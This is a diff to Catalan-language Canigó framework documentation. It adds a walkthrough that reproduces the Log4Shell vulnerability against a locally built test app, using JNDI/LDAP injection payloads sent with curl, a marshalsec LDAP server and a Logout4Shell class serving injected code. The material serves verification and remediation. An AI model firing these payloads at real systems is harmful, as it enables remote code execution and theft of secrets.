@@ -31,6 +31,136 @@ Informació de referència:
 * <https://securelist.com/cve-2021-44228-vulnerability-in-apache-log4j-library/105210/> \
 * <https://www.randori.com/blog/cve-2021-44228/>
 
+## Com explotar la vulnerabilitat a una aplicació Canigó
+
+* Crear una aplicació Canigó que utilitzi una versió de log4j vulnerable fent ús de l'archetype de Canigó:
+
+```sh
+# Canigó 3.6.0
+mvn archetype:generate \
+-DarchetypeGroupId=cat.gencat.ctti \
+-DarchetypeArtifactId=plugin-canigo-archetype-rest \
+-DarchetypeVersion=1.7.0 \
+-DartifactId=CanigoLog4jShellTest \
+-DgroupId=cat.gencat.ctti \
+-Dversion=1.0.0 -B
+```
+
+* Modificar el servei de prova: `EquipamentServiceController` per a imprimir al log els paràmetres d'entrada
+del servei de creació dels equipaments:
+
+```java
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+private static Logger log = LogManager.getLogger(EquipamentServiceController.class.getName());
+
+public void saveEquipament(@RequestBody Equipament equipament) {
+log.error("equipament.getNom() {}", equipament.getNom());
+...
+}
+```
+
+* Iniciar el projecte creat amb el servidor Tomcat embegut:
+
+```sh
+mvn clean spring-boot:run
+# or
+mvn clean package && java -jar ./target/CanigoLog4jShellTest.war
+# or
+mvn clean package docker:build \
+&& docker run -it --rm \
+--net=host \
+--name="log4jshell-local" \
+--memory="1024m" --memory-reservation="1024m" --memory-swap="1024m" --cpu-shares=2000 \
+canigo/app
+```
+
+### Utilizant el projecte `canarytokens`
+
+El projecte de codi obert `canarytokens` permet generar tokens per a explotar vulnerabilitats, de forma que, si en
+utilitzar un token s'explota una vulnerabilitat, s'envia un correu electrònic amb els detalls de l'accés.
+
+Per a més informació:
+
+* https://docs.canarytokens.org/guide
+* https://github.com/thinkst/canarytokens
+
+Pasos a seguir:
+
+* Generar un token tipus `Log4Shell` des de: <https://canarytokens.org/generate#>:
+
+```txt
+${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}
+```
+
+* Generar una petició HTTP Request per a crear un `equipament` i en el nom enviar el token maliciós creat amb `canarytokens`:
+
+```sh
+curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
+--header 'Content-Type: application/json' \
+--data-raw '{ "nom": "${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}","municipi": "Barcelona"}'
+```
+
+* Verificar que s'ha rebut un correu a l'adreça configurada a `canarytokens` i comprovar que en el contingut del correu
+s'inclou la traça de la connexió remota al servidor de l'aplicació:
+
+![Email exploit test](/images/howtos/log4jshell/email_exploit_alert.png)
+
+![Canary tokens exploit details 1](/images/howtos/log4jshell/canary_token_exploit_details1.png)
+
+![Canary tokens exploit details 2](/images/howtos/log4jshell/canary_token_exploit_details2.png)
+
+### Utilizant un servidor LDAP local
+
+Requereix: SO Linux, Python3, Git, Maven i accés a internet.
+
+Pasos a seguir:
+
+* Iniciar un servidor web que contingui el codi maliciós a injectar. Es pot utilitzar el projecte `https://github.com/cybereason/Logout4Shell.git`
+i modificar la classe `Log4jRCE.java` per a afegir qualsevol codi maliciós que es vulgui injectar al servidor. Per exemple, es pot injectar una traça:
+
+```java
+String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
+System.out.println("Log4JShell - JPJE ----------------------------: " + dateNow);
+```
+
+```sh
+git clone https://github.com/cybereason/Logout4Shell.git
+mvn clean package
+cd target/classes
+python3 -m http.server 8888
+```
+
+* Iniciar un servidor LDAP. Es pot utilitzar el projecte `https://github.com/mbechler/marshalsec.git`:
+
+```sh
+git clone https://github.com/mbechler/marshalsec.git
+mvn clean package -DskipTests
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
+```
+
+* Generar una petició HTTP Request per a crear un `equipament` i en el nom enviar `${jndi:ldap://127.0.0.1:1389/a}`:
+
+```sh
+curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
+--header 'Content-Type: application/json' \
+--data-raw '{ "nom": "${jndi:ldap://127.0.0.1:1389/a}","municipi": "Barcelona"}'
+```
+
+* Revisar en el log de l'aplicació `CanigoLog4jShellTest` els efectes d'explotar la vulnerabilitat.
+
+    > Amb la vulnerabilitat:
+
+![LDAP exploit](/images/howtos/log4jshell/log4jshell_trace1.gif)
+
+    > Sense la vulnerabilitat:
+
+![LDAP no exploit](/images/howtos/log4jshell/log4jshell_trace2.gif)
+
+On es pot apreciar en el log de `CanigoLog4jShellTest` la traça generada pel codi injectat.
+D'aquesta manera, per exemple, es podria obtenir les variables d'entorn, arxius de configuració i altres per a enviar-los per correu.
+
 ## Com solucionar la vulnerabilitat a les aplicacions
 
 * **Opció 1**) Substituir la versió de la dependència de la libreria `log4j` en temps de compilació.
